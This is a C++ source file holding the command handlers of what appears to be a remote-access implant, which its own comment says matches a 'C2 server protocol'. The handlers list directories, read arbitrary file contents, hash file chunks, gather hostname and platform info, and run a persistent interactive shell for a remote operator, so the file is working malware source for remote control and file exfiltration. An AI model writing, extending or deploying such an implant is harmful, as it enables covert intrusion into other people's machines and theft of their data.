#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "vector.h"
#include "system_info.h"
#include "string.h"

// =============================================================================
// Wire-format directory entry — fixed layout matching the C2 server protocol.
// Uses CHAR16 (always 2 bytes) instead of WCHAR (2 bytes on Windows, 4 on Linux)
// so that sizeof(WireDirectoryEntry) is identical on every platform.
// =============================================================================

#pragma pack(push, 1)
struct WireDirectoryEntry
{
    CHAR16 Name[256]; ///< UTF-16LE file/directory name
    UINT64 CreationTime;
    UINT64 LastModifiedTime;
    UINT64 Size;
    UINT32 Type;
    BOOL IsDirectory;
    BOOL IsDrive;
    BOOL IsHidden;
    BOOL IsSystem;
    BOOL IsReadOnly;
};
#pragma pack(pop)

/// Convert a native DirectoryEntry to the wire-format WireDirectoryEntry
static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
{
    StringUtils::WideToChar16(
        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
        Span<CHAR16>(dst.Name, 256));
    dst.CreationTime = src.CreationTime;
    dst.LastModifiedTime = src.LastModifiedTime;
    dst.Size = src.Size;
    dst.Type = src.Type;
    dst.IsDirectory = src.IsDirectory;
    dst.IsDrive = src.IsDrive;
    dst.IsHidden = src.IsHidden;
    dst.IsSystem = src.IsSystem;
    dst.IsReadOnly = src.IsReadOnly;
}

/// Decode a CHAR16 path from the wire protocol into a native WCHAR path.
/// Normalizes path separators to the platform convention (e.g. '\' → '/' on Linux).
static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return 0;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;
    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    // Normalize separators so that Windows-style '\' paths work on Linux
    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return len;
}

static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = code;
}

static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    WCHAR directoryPath[1024];
    DecodeWirePath(command, commandLength, directoryPath, 1024);
    LOG_INFO("Getting directory content for path: %ws", directoryPath);

    auto result = DirectoryIterator::Create(directoryPath);
    if (!result.IsOk())
    {
        LOG_ERROR("Invalid directory path: %ws", directoryPath);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    DirectoryIterator &iter = result.Value();

    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        LOG_ERROR("Failed to allocate directory entry buffer");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    while (iter.Next())
    {
        const DirectoryEntry &entry = iter.Get();
        if (IsDotEntry(entry))
            continue;

        if (!entries.Add(entry))
        {
            LOG_ERROR("Failed to grow directory entry buffer");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
    }

    UINT64 entryCount = (UINT64)entries.Count;
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
    *response = new CHAR[*responseLength];

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));

    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
    for (UINT64 i = 0; i < entryCount; i++)
    {
        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
        ToWireEntry(entries.Data[i], wireEntries[i]);
    }
}

VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
    LOG_INFO("Getting file content for path: %ws", filePath);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        LOG_ERROR("Failed to open file: %ws", filePath);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
    *response = new CHAR[*responseLength];

    USIZE responseOffset = sizeof(UINT32) + sizeof(UINT64);
    (void)file.SetOffset((USIZE)offset);
    auto readResult = file.Read(Span<UINT8>((UINT8 *)(*response + responseOffset), (USIZE)readCount));
    UINT32 bytesRead = readResult ? readResult.Value() : 0;

    *(PUINT32)*response = StatusCode::StatusSuccess;
    *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
}

VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
    LOG_INFO("Getting file chunk hash for path: %ws", filePath);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        LOG_ERROR("Failed to open file: %ws", filePath);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];

    SHA256 sha256;
    USIZE totalRead = 0;

    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        (void)file.SetOffset((USIZE)(offset + totalRead));
        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        UINT32 bytesRead = readResult ? readResult.Value() : 0;
        if (bytesRead == 0)
            break;

        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;

    *responseLength += SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
    LOG_INFO("File chunk hash computed successfully for %llu bytes read", totalRead);
}

VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Getting system info");

    SystemInfo info;
    GetSystemInfo(&info);

    *responseLength = sizeof(UINT32) + sizeof(SystemInfo);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &info, sizeof(SystemInfo));

    LOG_INFO("System info: hostname=%s, arch=%s, platform=%s", info.Hostname, info.Architecture, info.Platform);
}

VOID Handle_WriteShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling WriteShell command");

    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();

        if (!shellResult)
        {
            LOG_ERROR("Failed to create shell");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
    }

    auto writeResult = context->shell->Write(command, commandLength - sizeof('\0'));
    if (!writeResult)
    {
        LOG_ERROR("Failed to write to shell");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;

    LOG_INFO("WriteShell command handled successfully");
}

VOID Handle_ReadShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling ReadShell command");

    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();
        if (!shellResult)
        {
            LOG_ERROR("Failed to create shell");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
    }

    CHAR buffer[4096];

    auto readResult = context->shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        LOG_ERROR("Failed to read from shell");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // for null termination
    auto readResultLenght = readResult.Value() + 1;

    *responseLength += readResultLenght;
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), readResultLenght), Span<const CHAR>(buffer, readResultLenght));

    LOG_INFO("ReadShell command handled successfully");
}